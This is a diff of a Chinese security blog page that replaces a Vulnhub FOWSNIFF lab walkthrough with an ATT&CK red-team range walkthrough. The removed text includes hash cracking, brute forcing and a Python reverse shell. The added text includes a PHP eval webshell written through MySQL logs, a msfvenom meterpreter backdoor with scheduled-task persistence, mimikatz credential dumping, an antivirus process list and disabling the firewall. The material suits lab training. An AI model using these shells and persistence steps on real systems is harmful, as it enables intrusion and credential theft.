@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>vulnhub-FOWSNIFF靶机 | 子夜旅馆</title>
+  <title>ATT&amp;CK红队评估实战靶场一 | 子夜旅馆</title>
   <meta name="keywords" content=" 靶场 ">
-  <meta name="description" content="vulnhub-FOWSNIFF靶机 | 子夜旅馆">
+  <meta name="description" content="ATT&amp;CK红队评估实战靶场一 | 子夜旅馆">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="子夜旅馆">
 <meta property="og:type" content="website">
@@ -472,9 +472,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-vulnhub-FOWSNIFF靶机" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-ATT-CK红队评估实战靶场一" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">vulnhub-FOWSNIFF靶机</h1>
+        <h1 class="article-title">ATT&amp;CK红队评估实战靶场一</h1>
     
     <div class="article-meta">
         
@@ -499,12 +499,12 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2023-03-30 14:34:04'>2023-03-29 18:14</time>
+            发布时间 : <time class="date" title='最后更新: 2023-03-30 14:43:42'>2023-03-30 14:34</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:942</span>
+        <span>字数:792</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -523,7 +523,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub-FOWSNIFF-1-%E5%A4%84%E7%90%86%E5%AE%8C%E6%AF%95"><span class="toc-text">vulnhub-FOWSNIFF:1(处理完毕)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80"><span class="toc-text">0x01 下载地址</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E9%9D%B6%E6%9C%BA%E7%9B%AE%E6%A0%87"><span class="toc-text">0x02 靶机目标</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87"><span class="toc-text">0x03 工具准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4"><span class="toc-text">0x04 详细步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-text">一、主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">二、端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81Web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">三、Web信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-0%E8%AE%BF%E9%97%AE80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">3.0访问80信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1%E5%B0%9D%E8%AF%95%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-text">3.1尝试密码破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-text">3.2 目录爆破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81pop3%E6%B5%8B%E8%AF%95"><span class="toc-text">四、pop3测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%88%A9%E7%94%A8%E5%B7%B2%E7%9F%A5%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-text">4.1 利用已知账号密码爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-pop3%E7%99%BB%E5%BD%95"><span class="toc-text">4.2 pop3登录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81ssh%E6%94%BB%E5%87%BB"><span class="toc-text">五、ssh攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E6%96%B0%E5%BE%97%E5%88%B0%E7%9A%84%E5%AF%86%E7%A0%81%E5%8A%A0%E5%85%A5%E5%AD%97%E5%85%B8%EF%BC%8C%E5%B9%B6%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%88%86%E7%A0%B4"><span class="toc-text">将新得到的密码加入字典，并进一步爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95ssh"><span class="toc-text">登录ssh</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">六、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9ssh%E7%99%BB%E9%99%86%E4%B8%8A%E7%9A%84%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">对ssh登陆上的主机信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%8F%90%E6%9D%83"><span class="toc-text">七、提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-%E5%B0%9D%E8%AF%95%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">7.1 尝试反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-%E5%8A%A0%E5%9B%BAnc%E7%9A%84shell-%E5%B9%B6%E8%8E%B7%E5%BE%97flag"><span class="toc-text">7.2 加固nc的shell,并获得flag</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-text">靶场信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90"><span class="toc-text">网站获取权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#phpmyadmin%E8%8E%B7%E6%9D%83"><span class="toc-text">phpmyadmin获权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E6%8F%90%E5%8D%87"><span class="toc-text">权限维持&#x2F;提升</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">内网信息收集</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -539,149 +539,91 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="vulnhub-FOWSNIFF-1-处理完毕"><a href="#vulnhub-FOWSNIFF-1-处理完毕" class="headerlink" title="vulnhub-FOWSNIFF:1(处理完毕)"></a>vulnhub-FOWSNIFF:1(处理完毕)</h1><h1 id="0x01-下载地址"><a href="#0x01-下载地址" class="headerlink" title="0x01 下载地址"></a>0x01 下载地址</h1><p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/fowsniff/Fowsniff_CTF_ova.7z">https://download.vulnhub.com/fowsniff/Fowsniff_CTF_ova.7z</a></p>
-<h1 id="0x02-靶机目标"><a href="#0x02-靶机目标" class="headerlink" title="0x02 靶机目标"></a>0x02 靶机目标</h1><p>获得root权限+flag.txt一个</p>
-<h1 id="0x03-工具准备"><a href="#0x03-工具准备" class="headerlink" title="0x03 工具准备"></a>0x03 工具准备</h1><h1 id="0x04-详细步骤"><a href="#0x04-详细步骤" class="headerlink" title="0x04 详细步骤"></a>0x04 详细步骤</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><ol>
-<li>arp-scan -I eth1 -l    //-I  指定网卡<blockquote>
-<p>192.168.56.103  08:00:27:66:85:17       PCS Systemtechnik GmbH</p>
-</blockquote>
-</li>
+        <h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><p>这个靶场是红日安全，红队第一个靶机，          密码:hongrisec@2019<br>由四台虚拟机组成win2k3/win7/win2008/kali<br>kali(vm8)攻击机                             192.168.21.128<br>win7(vm2/8)对外边界服务器       192.168.52.143/192.168.21.146   开启phpstudy即可<br>win2k3(vm2)域成员                       192.168.52.141<br>win2008(vm2)域靶机                    192.168.52.138</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ol>
+<li>arp-scan -l或者nmap -sU –script nbstat.nse -p137 -T4 192.168.21.128/24</li>
+<li>nmap -T4 -f -sS -p- 192.168.21.146<br>Not shown: 65523 closed ports<br>PORT STATE SERVICE<br>80/tcp open http<br>135/tcp open msrpc<br>139/tcp open netbios-ssn<br>445/tcp open microsoft-ds<br>1025/tcp open NFS-or-IIS<br>1026/tcp open LSA-or-nterm<br>1027/tcp open IIS<br>1028/tcp open unknown<br>1030/tcp open iad1<br>1031/tcp open iad2<br>3306/tcp open mysql<br>5357/tcp open wsdapi<br>MAC Address: 00:0C:29:4F:8D:05 (VMware)</li>
+<li>对80/135/445/3306端口进行测试</li>
+<li>dirsearch -u 192.168.21.140<br>dirb  <a target="_blank" rel="noopener" href="http://192.168.21.140/">http://192.168.21.140</a><br>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -u <a target="_blank" rel="noopener" href="http://192.168.21.140/">http://192.168.21.140</a><br>目录扫描获取<br>[21:16:08] 200 - 2KB - /phpmyadmin/README<br>[21:16:09] 200 - 32KB - /phpmyadmin/ChangeLog<br>[21:16:10] 200 - 4KB - /phpMyAdmin/index.php</li>
 </ol>
-<h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><ol>
-<li><p>sudo nmap  –min-rate 10000 -p- 192.168.56.103<br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301319723.png" alt="image-20230329211917761"></p>
-</li>
-<li><p>sudo nmap -sT -sV -O -p 22,80,110,143 192.168.56.103<br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301319656.png" alt="image-20230329212031601"></p>
-</li>
+<h3 id="网站获取权限"><a href="#网站获取权限" class="headerlink" title="网站获取权限"></a>网站获取权限</h3><h4 id="phpmyadmin获权"><a href="#phpmyadmin获权" class="headerlink" title="phpmyadmin获权"></a>phpmyadmin获权</h4><ol>
+<li>登录<a target="_blank" rel="noopener" href="http://192.168.21.146/phpmyadmin/%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81root:root">http://192.168.21.146/phpmyadmin/默认密码root:root</a></li>
+<li>show variables like ‘%secure_file%’;   查看是否有任意位置读写文件权限<br>null  发现没权限into outfile<br>show variables like ‘%general%’; #查看日志状<br>SET GLOBAL general_log=’on’ #开启general<br>set global general_log_file=’C:/phpstudy/www/cmd.php’; #将路径改为<br>SELECT “<?PHP @EVAL($_POST['zyx']);?>“ #一句话木马</li>
+<li>写马成功，蚁剑登录</li>
 </ol>
-<h2 id="三、Web信息收集"><a href="#三、Web信息收集" class="headerlink" title="三、Web信息收集"></a>三、Web信息收集</h2><h3 id="3-0访问80信息收集"><a href="#3-0访问80信息收集" class="headerlink" title="3.0访问80信息收集"></a>3.0访问80信息收集</h3><p>##打开80端口web页面，得知数据泄露@fowsniffcorp Twitter</p>
-<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301036303.png" alt="image-20230330103653061"></p>
-<p>##谷歌搜@fowsniffcorp Twitter</p>
-<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301042029.png" alt="image-20230330104017343"></p>
-<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301042635.png" alt="image-20230330104156320"><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301043949.png" alt="image-20230330104304508"></p>
-<pre><code>mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
-mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
-tegel@fowsniff:1dc352435fecca338acfd4be10984009
-baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
-seina@fowsniff:90dc16d47114aa13671c697fd506cf26
-stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
-mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
-parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
-sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
-</code></pre>
-<h3 id="3-1尝试密码破解"><a href="#3-1尝试密码破解" class="headerlink" title="3.1尝试密码破解"></a>3.1尝试密码破解</h3><ol>
-<li><p>转存hash为1.txt</p>
-</li>
-<li><p>利用hash-identifier 来判断是什么hash</p>
-<pre><code>hash-identifier 8a28a94a588a95b80163709ab4313aa4   
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301051021.png" alt="image-20230330105022365"></p>
-</li>
-<li><p>尝试爆破密码</p>
-<pre><code>gzip -d /usr/share/wordlists/rockyou.txt.gz
-john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt 1.txt  &gt; 2
-</code></pre>
-</li>
-<li><p>转存字典</p>
-<pre><code>cat 2|awk -F&#39; &#39; &#39;&#123;print $1&#125;&#39; &gt; pass
-cat 2|awk -F&#39; &#39; &#39;&#123;print $2&#125;&#39; | awk -F&#39;@&#39; &#39;&#123;print $1&#125;&#39;|awk -F&#39;(&#39; &#39;&#123;print $2&#125;&#39; &gt; user
-//-F 指定分隔符
-</code></pre>
-</li>
-<li><p>尝试破解ssh登录</p>
-<pre><code>crackmapexec ssh 192.168.56.103 -u user -p pass  --continue-on-success   //成功后继续尝试
-</code></pre>
-<p>遗憾的是全部失败</p>
-<h3 id="3-2-目录爆破"><a href="#3-2-目录爆破" class="headerlink" title="3.2 目录爆破"></a>3.2 目录爆破</h3></li>
-<li><p>中号字典试试</p>
-<pre><code>gobuster dir -u http://192.168.56.103 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
-</code></pre>
-</li>
+<h4 id="权限维持-提升"><a href="#权限维持-提升" class="headerlink" title="权限维持/提升"></a>权限维持/提升</h4><ol>
+<li>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.21.128 lpost=4444 -f exe -o 1.exe      #msf产生后门   蚁剑执行</li>
+<li>use exploit/multi/handler<br>set payload<br>set lhost<br>run监听</li>
+<li>获得权限shell      chcp  65001去除乱码<br>schtasks /create /tn solrindex  “ma” /tr C:\phpstudy\www\1.exe /sc minute /mo 1（windows添加<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jasonliujintao/article/details/80397116">计划任务</a>每分钟执行一次）<br>getsystem<br>ps<br>migrate  520                 注入到一个system的进程里<br>run persistence -X -i 50 -p 4444 -r 192.168.21.128</li>
 </ol>
-<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301218681.png" alt="image-20230330113730412"></p>
-<ol start="2">
-<li>大号字典试试</li>
+<h4 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h4><ol>
+<li>load kiwi<br>creds_all     获取Administrator GOD hongrisec@2019</li>
+<li>判断域信息<br>whoami        #god/administrator查看当前权限<br>hostname     #stu1显示主机名称<br>net user        #Administrator Guest liukaifeng01查询用户列表<br>net localgroup administrators   #Administrator;liukaifeng01获取本地管理员（通常包含域用户）信息<br>systeminfo   #使用systeminfo查看系统详细信息<br>shell tasklist   #查询进程列表,看看有没有杀毒软件进程ipconfig            #dns为god.org域和dns一般为同一台主机<br>net view            #查看域信息\OWA\ROOTTVI862UBEH\STU1<br>net config workstation     #查看当前登录域及登录用户信息GOD<br>net view /domain  #查询域GOD<br>net view /domain:GOD     #查询 GOD域内全部主机\OWA\ROOT-TVI862UBEH\STU1</li>
 </ol>
-<pre><code>gobuster dir -u http://192.168.56.103 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt 
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301218344.png" alt="image-20230330121557947"><br>……还是没有，看来目录扫描路断了</p>
-<h2 id="四、pop3测试"><a href="#四、pop3测试" class="headerlink" title="四、pop3测试"></a>四、pop3测试</h2><h3 id="4-1-利用已知账号密码爆破"><a href="#4-1-利用已知账号密码爆破" class="headerlink" title="4.1 利用已知账号密码爆破"></a>4.1 利用已知账号密码爆破</h3><pre><code class="bash">hydra -L user -P pass -f 192.168.56.103 pop3    //-f 成功一次就结束
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301227159.png" alt="image-20230330122713319"><br>seina    scoobydoo2</p>
-<h3 id="4-2-pop3登录"><a href="#4-2-pop3登录" class="headerlink" title="4.2 pop3登录"></a>4.2 pop3登录</h3><pre><code>nc 192.168.56.103 110
-user seina
-pass  scoobydoo2
-list 
-retr 1
-retr 2
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301407358.png" alt="image-20230330122950925"></p>
+<table>
+<thead>
+<tr>
+<th>进程名</th>
+<th>软件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>360sd.exe</td>
+<td>360 杀毒</td>
+</tr>
+<tr>
+<td>360tray.exe</td>
+<td>360 实时保护</td>
+</tr>
+<tr>
+<td>ZhuDongFangYu.exe</td>
+<td>360 主动防御</td>
+</tr>
+<tr>
+<td>KSafeTray.exe</td>
+<td>金山卫士</td>
+</tr>
+<tr>
+<td>SafeDogUpdateCenter.exe</td>
+<td>安全狗</td>
+</tr>
+<tr>
+<td>McAfee</td>
+<td>McShield.exe</td>
+</tr>
+<tr>
+<td>egui.exe</td>
+<td>NOD32</td>
+</tr>
+<tr>
+<td>AVP.exe</td>
+<td>卡巴斯基</td>
+</tr>
+<tr>
+<td>avguard.exe</td>
+<td>小红伞</td>
+</tr>
+<tr>
+<td>bdagent.exe</td>
+<td>BitDefender</td>
+</tr>
+</tbody></table>
+<ol>
+<li>cs上线<br>SMB Beacon有两种使用方式：这里我们使用第二种方式，创建SMB监听：</li>
+</ol>
 <ul>
-<li>第一封邮件<pre><code>Return-Path: &lt;stone@fowsniff&gt;
-X-Original-To: seina@fowsniff
-Delivered-To: seina@fowsniff
-Received: by fowsniff (Postfix, from userid 1000)
-      id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
-To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
-  mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
-  tegel@fowsniff
-Subject: URGENT! Security EVENT!
-Message-Id: &lt;20180313185107.0FA3916A@fowsniff&gt;
-Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
-From: stone@fowsniff (stone)
-Dear All,
-A few days ago, a malicious actor was able to gain entry to
-our internal email systems. The attacker was able to exploit
-incorrectly filtered escape characters within our SQL database
-to access our login credentials. Both the SQL and authentication
-system used legacy methods that had not been updated in some time.
-We have been instructed to perform a complete internal system
-overhaul. While the main systems are &quot;in the shop,&quot; we have
-moved to this isolated, temporary server that has minimal
-functionality.
-This server is capable of sending and receiving emails, but only
-locally. That means you can only send emails to other users, not
-to the world wide web. You can, however, access this system via 
-the SSH protocol.
-The temporary password for SSH is &quot;S1ck3nBluff+secureshell&quot;
-You MUST change this password as soon as possible, and you will do so under my
-guidance. I saw the leak the attacker posted online, and I must say that your
-passwords were not very secure.
-Come see me in my office at your earliest convenience and we&#39;ll set it up.
-Thanks,
-A.J Stone
-</code></pre>
-有用的信息<code>S1ck3nBluff+secureshell</code></li>
+<li><ul>
+<li>直接派生一个孩子，目的为了进一步盗取hash</li>
+<li>在已有的beacon上创建监听，用来作为跳板进行内网渗透</li>
 </ul>
-<h2 id="五、ssh攻击"><a href="#五、ssh攻击" class="headerlink" title="五、ssh攻击"></a>五、ssh攻击</h2><h3 id="将新得到的密码加入字典，并进一步爆破"><a href="#将新得到的密码加入字典，并进一步爆破" class="headerlink" title="将新得到的密码加入字典，并进一步爆破"></a>将新得到的密码加入字典，并进一步爆破</h3><pre><code>crackmapexec ssh 192.168.56.103 -u user -p &quot;S1ck3nBluff+secureshell&quot;  --continue-on-success
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301239460.png" alt="image-20230330123953414"></p>
-<ul>
-<li>获得baksteen:S1ck3nBluff+secureshell 一组ssh<h3 id="登录ssh"><a href="#登录ssh" class="headerlink" title="登录ssh"></a>登录ssh</h3><pre><code class="bash">ssh baksteen@192.168.56.103
-baksteen:S1ck3nBluff+secureshell 
-</code></pre>
 </li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301243350.png" alt="image-20230330124308311"></p>
-<h2 id="六、信息收集"><a href="#六、信息收集" class="headerlink" title="六、信息收集"></a>六、信息收集</h2><h3 id="对ssh登陆上的主机信息收集"><a href="#对ssh登陆上的主机信息收集" class="headerlink" title="对ssh登陆上的主机信息收集"></a>对ssh登陆上的主机信息收集</h3><pre><code>whoami
-ifconfig
-id
-find / -user root -perm -4000 -print 2&gt;/dev/null   
-sudo -l 
-find / -group users -type f 2&gt;/dev/null       //发现/opt/cube/cube.sh文件每次ssh连接成功都会以root身份运行
-dpkg -l |grep python
-</code></pre>
-<h2 id="七、提权"><a href="#七、提权" class="headerlink" title="七、提权"></a>七、提权</h2><h3 id="7-1-尝试反弹shell"><a href="#7-1-尝试反弹shell" class="headerlink" title="7.1 尝试反弹shell"></a>7.1 尝试反弹shell</h3><ul>
-<li>在/opt/cube/cube.sh追加<pre><code>export RHOST=&quot;192.168.56.102&quot;;export RPORT=4444;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;;
-</code></pre>
-</li>
-<li>kali监听<code>nc -nvlp 4444</code></li>
-<li>ssh登录获得反弹shell<h3 id="7-2-加固nc的shell-并获得flag"><a href="#7-2-加固nc的shell-并获得flag" class="headerlink" title="7.2 加固nc的shell,并获得flag"></a>7.2 加固nc的shell,并获得flag</h3><pre><code class="bash">python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;     
-ctrl +z 
-stty raw -echo;fg;reset 
-</code></pre>
-</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301318611.png" alt="image-20230330131819278"></p>
+<ol>
+<li>关闭防火墙shell netsh firewall show state<br>shell netsh advfirewall set allprofiles state off</li>
+<li>之后利用cs，网络扫描，进行上图操作，获取hash，迷糊桃，获取其他机器密码</li>
+<li>密码192.168.52.138，成功获得域控权限，同理获得2003权限，渗透结束<img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303301443848.png" alt="img"></li>
+<li>文章参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46527080/article/details/112648202">1</a>.<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/13769940.html">2</a>.<a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/115672287?ops_request_misc=%7B%22request_id%22:%22164705013016780261925621%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164705013016780261925621&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-8-115672287.pc_search_result_control_group&utm_term=vulnstack&spm=1018.2226.3001.4187">3</a>.<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_65244586/article/details/122631373?ops_request_misc=&request_id=&biz_id=102&utm_term=vulnstack&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-122631373.nonecase&spm=1018.2226.3001.4187">4</a>.<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37043565/article/details/106505565">5</a>.<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46527080/article/details/112648202">6</a><br>cs使用<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44677409/article/details/102725129">1</a>.<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38348692/article/details/99705306">2</a>.<a target="_blank" rel="noopener" href="https://www.cnblogs.com/k1ng/p/12168709.html">3</a></li>
+</ol>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1210396142@qq.com </span>
